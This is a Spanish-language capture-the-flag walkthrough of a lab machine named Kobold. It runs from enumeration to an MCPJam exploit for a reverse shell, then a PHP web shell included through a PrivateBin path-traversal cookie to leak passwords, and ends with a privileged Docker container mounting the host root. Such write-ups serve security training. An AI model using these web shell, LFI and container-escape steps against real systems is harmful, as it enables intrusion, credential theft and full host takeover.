
# Kobold

<figure><img src="/files/HTS4ygEVOo6NRxhbEbIV" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `Kobold`
* **IP:** `10.129.245.50`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `29/04/2026`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.245.50 kobold.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -p- --min-rate 10000 10.129.245.50
```

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3552/tcp open  taserver
```

#### Escaneo Dirigido

Podemos usar Visual Map importando un escaneo agresivo de Nmap en formato XML para detectar posibles vulnerabilidades o vectores de entrada, y posibles pasos de explotación:

```bash
sudo nmap -p 22,80,443,3552 -sCV 10.129.245.50
```

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    nginx 1.24.0 (Ubuntu)
|_http-title: 301 Moved Permanently
443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: Arcane
3552/tcp open  http    Arcane v1.13.0
|_http-title: Arcane
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Destacan los puertos:

* **22** (SSH OpenSSH 9.6p1)
* **80** (HTTP nginx - redirige a HTTPS)
* **443** (HTTPS nginx - aplicación Arcane)
* **3552** (HTTP - Arcane Docker Management Platform)

***

## <mark style="color:$primary;">Enumeración Web</mark>

#### Acceso al puerto 3552

Accedemos a `http://10.129.245.50:3552` y descubrimos que se trata de **Arcane**, una plataforma de gestión de contenedores Docker moderna.

<figure><img src="/files/nHmQCwRRUPONCCykVqb8" alt=""><figcaption></figcaption></figure>

#### Identificación de la aplicación

Consultamos información de versión a través de la API:

```bash
curl -s http://10.129.245.50:3552/api/app-version | jq
```

```json
{
  "currentVersion": "v1.13.0",
  "revision": "2e32ef44",
  "goVersion": "go1.25.5",
  "buildTime": "2026-01-15T01:03:57Z",
  "displayVersion": "v1.13.0",
  "isSemverVersion": true
}
```

**Datos importantes:**

* Versión: **v1.13.0**
* Revisión de commit: **2e32ef44**
* Compilado: **15 de enero de 2026**
* Backend en **Golang**

***

## <mark style="color:$primary;">Enumeración de Subdominios (VHosts)</mark>

#### Fuzzing con FFUF

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -fs 154 -ignore-body
*** Warning: possible undesired combination of -ignore-body and the response options: fl,fs,fw,ml,ms and mw.

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://kobold.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.kobold.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 52ms]
```

**Encontramos el subdominio:** `mcp.kobold.htb`

Lo añadimos a `/etc/hosts`:

```bash
echo "10.129.245.50 mcp.kobold.htb" | sudo tee -a /etc/hosts
```

Y accedemos a `MCPJam`:

<figure><img src="/files/fxY8Vb30OH6KojWwGTmI" alt=""><figcaption></figcaption></figure>

### Búsqueda de exploits

Encontramos el siguiente CVE para MCPJam, el cual permite a un atacante **no autenticado** registrar un servidor MCP (Model Context Protocol) arbitrario con una configuración maliciosa. Al no existir validación ni sanitización del campo `command` y sus `args`, es posible inyectar comandos del sistema operativo que se ejecutan directamente en el servidor con los privilegios del proceso web.

Esto resulta en una **ejecución remota de código (RCE)** que puede aprovecharse para obtener una **reverse shell** sobre el sistema comprometido.

{% embed url="<https://github.com/CyLock11/CVE-2026-23744>" %}

***

## <mark style="color:$primary;">Explotación</mark>

### Ejecución del Exploit

```bash
python3 cve-2026-23744.py -l 10.10.15.25 -u https://mcp.kobold.htb
```

Debemos abrir un listener por el puerto 443, yo en vez de Netcat usaré Penelope:

```bash
penelope -p 443
```

Y recibimos la shell!

<figure><img src="/files/vLnkRrVp588b5hXj2xJj" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">User Flag</mark>

```bash
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cd /home
ben@kobold:/home$ ls
alice  ben
ben@kobold:/home$ cd ben
ben@kobold:~$ ls
user.txt
ben@kobold:~$ cat user.txt 
15a23dc2a131c8b55c883db4********
```

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos la contraseña de Ben:

```bash
ben@kobold:~$ sudo -l
[sudo] password for ben: 

Sorry, try again.
[sudo] password for ben: 
Sorry, try again.
[sudo] password for ben: 
sudo: 2 incorrect password attempts
```

### Enumeración de grupos

Observamos que ben pertenece al grupo operator:

```bash
ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

Y el otro usuario en la máquina, `alice`, está en el grupo docker:

```bash
ben@kobold:~$ cat /etc/group | grep docker
docker:x:111:alice
```

### Procesos corriendo

```bash
ben@kobold:~$ ss -tlnp

State   Recv-Q  Send-Q     Local Address:Port      Peer Address:Port  Process                           
LISTEN  0       4096           127.0.0.1:8080           0.0.0.0:*                                       
LISTEN  0       4096          127.0.0.54:53             0.0.0.0:*                                       
LISTEN  0       4096       127.0.0.53%lo:53             0.0.0.0:*                                       
LISTEN  0       4096           127.0.0.1:40365          0.0.0.0:*                                       
LISTEN  0       4096             0.0.0.0:22             0.0.0.0:*                                       
LISTEN  0       511              0.0.0.0:80             0.0.0.0:*                                       
LISTEN  0       511              0.0.0.0:443            0.0.0.0:*                                       
LISTEN  0       511            127.0.0.1:6274           0.0.0.0:*      users:(("node",pid=1632,fd=33))  
LISTEN  0       4096                   *:3552                 *:*                                       
LISTEN  0       4096                [::]:22                [::]:*                                       
```

Observamos que una aplicación está corriendo por el puerto 8080, concretamente una aplicación llamada `PrivateBin`.

<table data-header-hidden><thead><tr><th width="143"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td>IP</td><td>Puerto</td><td>Servicio</td></tr><tr><td>127.0.0.1</td><td>8080</td><td>Contenedor Docker (PrivateBin)</td></tr><tr><td>127.0.0.1</td><td>6274</td><td>Inspector de MCPJam (nodo)</td></tr><tr><td>0.0.0.0</td><td>443/80</td><td>nginx</td></tr><tr><td>*</td><td>3552</td><td>Arcane</td></tr></tbody></table>

El puerto 8080 solo escucha en localhost; no era visible durante el escaneo externo. Vamos a comprobarlo:

```bash
ben@kobold:~$ ps aux | grep 8080

root        1953  0.0  0.1 1671112 4448 ?        Sl   14:39   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080 -use-listen-fd
ben       162016  0.0  0.0   6900  2072 pts/0    S+   17:14   0:00 grep --color=auto 8080
```

Este es un contenedor Docker. Veamos la configuración de nginx:

```bash
ben@kobold:~$ cat /etc/nginx/sites-enabled/privatebin

server {
    listen 80;
    server_name bin.kobold.htb;
    return 301 https://bin.kobold.htb$request_uri;
}

server {
    listen 443 ssl;
    server_name bin.kobold.htb;
    <----SNIP---->
```

Descubrimos otro subdominio **`bin.kobold.htb`** que actúa como proxy hacia PrivateBin en un contenedor Docker. Lo agregamos al archivo hosts en la máquina atacante y lo abrimos en el navegador en el navegador:

<figure><img src="/files/ACjKVWUvTYVhJzKAZSFm" alt=""><figcaption></figcaption></figure>

### PrivateBin

**PrivateBin 2.0.2** es un servidor de pegado autoalojado con cifrado del lado del cliente. Esta versión es vulnerable a LFI (`CVE-2025-64714`, afecta a las versiones `1.7.7`–`2.0.2`). Sin embargo, para explotarla, necesitamos la capacidad de escribir un archivo PHP en el sistema de archivos del contenedor. Recordemos que ben es miembro de un grupo `operator`; veamos qué proporciona:

```bash
ben@kobold:~$ find / -group operator -type f 2>/dev/null | head -20

/privatebin-data/certs/key.pem
/privatebin-data/certs/cert.pem
/privatebin-data/data/purge_limiter.php
/privatebin-data/data/.htaccess
/privatebin-data/data/traffic_limiter.php
/privatebin-data/data/salt.php
```

El grupo `operator`tiene **acceso de lectura y escritura** a `/privatebin-data/`este volumen de Docker montado en el contenedor PrivateBin. El directorio `/privatebin-data/data/`es totalmente editable.

Este es un hallazgo importante: podemos escribir archivos en un volumen que será visible dentro del contenedor.

### PrivateBin LFI → Fuga de credenciales

#### **Vulnerabilidad: CVE-2025-64714**&#x20;

Con PrivateBin habilitado, `templateselection = true` confía en las cookies `template` para seleccionar la plantilla PHP. Mediante el recorrido de rutas, puede incluir cualquier archivo PHP relativo al directorio `tpl/`. LFI por sí solo parece inútil en un contenedor: estamos limitados a su sistema de archivos. Pero tenemos un volumen de escritura compartido entre el host y el contenedor. Esto nos permite construir una cadena.

#### Explotación

**Paso 1: elimine el webshell del host (shell como ben):**

```bash
cat > /privatebin-data/data/pwn.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

**Paso 2 - LFI a través de cookie de plantilla (máquina atacante):**

```bash
curl -k https://bin.kobold.htb/ \
  -b "template=../data/pwn" \
  -G --data-urlencode "cmd=id"
  
uid=65534(nobody) gid=82(www-data) groups=82(www-data)
```

LFI está en funcionamiento. Estamos ejecutando código dentro del contenedor Docker `PrivateBin`.

**Paso 3: fusionar la configuración:**

```bash
curl -k https://bin.kobold.htb/ \
  -b "template=../data/pwn" \
  -G --data-urlencode "cmd=cat /srv/cfg/conf.php"
```

Eso nos muestra el contenido del archivo de configuración de PrivateBin mediante LFI: `cat /srv/cfg/conf.php`. En el archivo de configuración, encontramos la sección MySQL con las credenciales actuales:

```bash
curl -k https://bin.kobold.htb/ \
  -b "template=../data/pwn" \
  -G --data-urlencode "cmd=cat /srv/cfg/conf.php" | grep pwd

  ;pwd = null
  ;pwd = "Z3r0P4ss"
  ;pwd = "ComplexP@ss******************"
```

#### **Reutilización de credenciales → Panel de control Arcane**

Cada contraseña encontrada durante una prueba de penetración debe probarse **en todos** los servicios descubiertos. Esto no es opcional, es una lista de verificación obligatoria.

* [ ] SSH (alice, ben, root)
* [ ] su alice / su root
* [ ] Dashboard de Arcane

Probamos por SSH y cambiar de usuario desde la shell sin éxito, por lo que probamos en el panel de arcane:

<figure><img src="/files/iBHRYAlivc7iLbgevPDe" alt=""><figcaption></figcaption></figure>

Y vemos que conseguimos acceder sin problema:

<figure><img src="/files/IULQMgaSEGTiP0dVeB9w" alt=""><figcaption></figcaption></figure>

Un panel de administración de Docker con todas las funciones: contenedores, imágenes, volúmenes, redes; todo bajo control.

{% hint style="success" %}
**Lección aprendida:** Al reutilizar credenciales, siempre revisa las cuentas predeterminadas en la documentación del producto. Las contraseñas pueden cambiarse, pero los nombres de usuario a menudo se dejan sin cambios.
{% endhint %}

### **Creación de un contenedor privilegiado**

Arcane permite crear contenedores Docker a través de su interfaz de usuario. Si creamos un contenedor que monte el sistema de archivos raíz del host, obtendremos acceso root completo.

**Containers → Create container** con los siguientes parámetros:

#### **Pestaña basic:**

<table data-header-hidden><thead><tr><th width="230.6666259765625"></th><th></th></tr></thead><tbody><tr><td><strong>Parámetro</strong></td><td><strong>Significado</strong></td></tr><tr><td>Container name</td><td><code>pwned</code> <em>(podemos escribir cualquier cosa)</em></td></tr><tr><td>Image</td><td><code>privatebin/nginx-fpm-alpine:2.0.2</code></td></tr><tr><td>Command</td><td><code>/bin/bash</code></td></tr><tr><td>User</td><td><code>0</code></td></tr></tbody></table>

No modificamos los demás parámetros de esta pestaña.

<figure><img src="/files/If16NGlXoa5WjaW92KnJ" alt=""><figcaption></figcaption></figure>

#### **Pestaña Volumes:**

| Origen (Host) | Ruta del contenedor |
| ------------- | ------------------- |
| `/`           | `/hostfs`           |

<figure><img src="/files/nCMFduzyJ8FyvuIB9RZe" alt=""><figcaption></figcaption></figure>

#### **Pestaña Network & Security:**

* [x] Marca la casilla para **el modo privilegiado.**

<figure><img src="/files/ZjmTNyYBusMiD6N0Cyvv" alt=""><figcaption></figcaption></figure>

Haz clic en **Create container**, ejecútalo pinchando en el nombre y abre **Shell** :

<figure><img src="/files/oM2Gl2FxSpJ6XThNptGY" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

```bash
/var/www # whoami
root

/var/www # ls -la /hostfs/root
total 87268
drwx------    7 root     root          4096 Apr 29 14:39 .
drwxr-xr-x   22 root     root          4096 Mar 16 20:57 ..
-rw-r--r--    1 root     root            29 Mar 19 03:09 .bash_history
-rw-r--r--    1 root     root          3106 Apr 22  2024 .bashrc
drwx------    2 root     root          4096 Mar 15 21:23 .cache
drwxr-xr-x    3 root     root          4096 Mar 15 21:23 .local
drwxr-xr-x    4 root     root          4096 Mar 15 21:23 .npm
-rw-r--r--    1 root     root           161 Apr 22  2024 .profile
drwx------    2 root     root          4096 Mar 15 21:23 .ssh
-rwxr-xr-x    1 root     root      89313464 Jan 15 01:05 arcane_linux_amd64
drwxr-xr-x    3 root     root          4096 Apr 29 14:39 data
-rw-r-----    1 root     root            33 Apr 29 14:39 root.txt

/var/www # cat /hostfs/root/root.txt
a4f3f12d60c03957fe6ba2cc********
```
